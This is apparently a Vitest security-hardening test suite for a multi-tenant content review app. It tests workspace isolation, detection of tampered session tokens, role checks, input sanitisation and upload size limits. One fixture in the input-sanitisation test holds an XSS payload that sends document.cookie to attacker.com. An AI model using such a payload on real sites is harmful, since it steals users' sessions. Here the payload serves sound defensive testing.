import { describe, it, expect, beforeAll } from 'vitest';
import { createTestDatabase } from './helpers/test-db';
import {
  workspaces,
  users,
  contentItems,
} from '../src/lib/db/schema';
import {
  createSessionToken,
  verifySessionToken,
} from '../src/lib/auth/session';
import { recordContentDecision, WorkflowError } from '../src/lib/services/workflow';
import { extractTextFromFile } from '../src/lib/services/extract';
import { runRules } from '../src/lib/engine';

describe('Stage S7 — Security Hardening & Isolation Suite', () => {
  const WS_ALPHA = '11111111-1111-1111-1111-111111111111';
  const WS_BETA = '22222222-2222-2222-2222-222222222222';

  const USER_CREATOR_ALPHA = 'aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa';
  const USER_REVIEWER_BETA = 'bbbbbbbb-bbbb-bbbb-bbbb-bbbbbbbbbbbb';

  const ITEM_ALPHA = 'cccccccc-cccc-cccc-cccc-cccccccccccc';

  beforeAll(async () => {
    const db = await createTestDatabase();

    // Seed 2 distinct workspaces
    await db.insert(workspaces).values([
      { id: WS_ALPHA, name: 'Workspace Alpha' },
      { id: WS_BETA, name: 'Workspace Beta' },
    ]);

    // Seed Users in different workspaces
    await db.insert(users).values([
      {
        id: USER_CREATOR_ALPHA,
        workspaceId: WS_ALPHA,
        email: 'creator@alpha.com',
        displayName: 'Creator Alpha',
        role: 'creator',
      },
      {
        id: USER_REVIEWER_BETA,
        workspaceId: WS_BETA,
        email: 'reviewer@beta.com',
        displayName: 'Reviewer Beta',
        role: 'reviewer',
      },
    ]);

    // Seed Content Item in Workspace Alpha
    await db.insert(contentItems).values({
      id: ITEM_ALPHA,
      workspaceId: WS_ALPHA,
      ownerId: USER_CREATOR_ALPHA,
      contentType: 'blog',
      title: 'Confidential Alpha Strategy',
      status: 'draft',
    });
  });

  describe('1. IDOR Prevention & Multi-Tenant Workspace Isolation', () => {
    it('Blocks user from Workspace Beta from deciding on content in Workspace Alpha', async () => {
      await expect(
        recordContentDecision({
          contentItemId: ITEM_ALPHA,
          userId: USER_REVIEWER_BETA,
          userRole: 'reviewer',
          workspaceId: WS_BETA,
          decision: 'approved',
        })
      ).rejects.toThrow(WorkflowError);
    });
  });

  describe('2. Session Security & Tamper Resistance', () => {
    it('Fails verification when HMAC signature or payload is tampered', async () => {
      const validToken = createSessionToken({
        sub: USER_CREATOR_ALPHA,
        wid: WS_ALPHA,
        role: 'creator',
        email: 'creator@alpha.com',
        displayName: 'Creator Alpha',
        isDemo: true,
      });

      // 1. Valid token verifies cleanly
      const verified = verifySessionToken(validToken);
      expect(verified).not.toBeNull();
      expect(verified?.sub).toBe(USER_CREATOR_ALPHA);

      // 2. Tampered token payload (privilege escalation attempt)
      const [payload, sig] = validToken.split('.');
      const decodedPayload = JSON.parse(Buffer.from(payload, 'base64url').toString('utf8'));
      decodedPayload.role = 'manager';
      const tamperedPayload = Buffer.from(JSON.stringify(decodedPayload)).toString('base64url');
      const forgedToken = `${tamperedPayload}.${sig}`;

      const forgedResult = verifySessionToken(forgedToken);
      expect(forgedResult).toBeNull();

      // 3. Corrupted HMAC signature
      const corruptedSigToken = `${payload}.invalidsignaturexyz123`;
      const corruptedResult = verifySessionToken(corruptedSigToken);
      expect(corruptedResult).toBeNull();
    });
  });

  describe('3. Role Escalation Prevention', () => {
    it('Denies approval permission to a user with creator role', async () => {
      await expect(
        recordContentDecision({
          contentItemId: ITEM_ALPHA,
          workspaceId: WS_ALPHA,
          userId: USER_CREATOR_ALPHA,
          userRole: 'creator',
          decision: 'approved',
        })
      ).rejects.toThrow('cannot approve or reject content');
    });
  });

  describe('4. Input Sanitization & Injection Defense', () => {
    it('Treats malicious XSS scripts and prompt injections as literal text without execution', () => {
      const xssInput = "<script>window.location='http://attacker.com?steal='+document.cookie</script><img src=x onerror=alert(1)> Our panels are the cheapest.";
      const findings = runRules(xssInput);

      // Successfully processed without crashing
      expect(findings.length).toBeGreaterThan(0);
      // Detected the banned term 'cheapest' despite surrounding XSS tags
      expect(findings.map((f) => f.ruleKey)).toContain('TERM-001');

      // The raw script text is indexed literally
      const termFinding = findings.find((f) => f.ruleKey === 'TERM-001')!;
      expect(xssInput.slice(termFinding.spanStart, termFinding.spanEnd)).toBe('cheapest');
    });
  });

  describe('5. Upload Size Limit Defense', () => {
    it('Rejects files exceeding the 10MB limit with an explicit size violation', async () => {
      const elevenMB = 11 * 1024 * 1024;
      const oversizedBuffer = Buffer.alloc(elevenMB, 'a');

      await expect(
        extractTextFromFile('oversized_payload.txt', oversizedBuffer)
      ).rejects.toThrow('File exceeds maximum allowed upload size of 10 MB.');
    });
  });
});
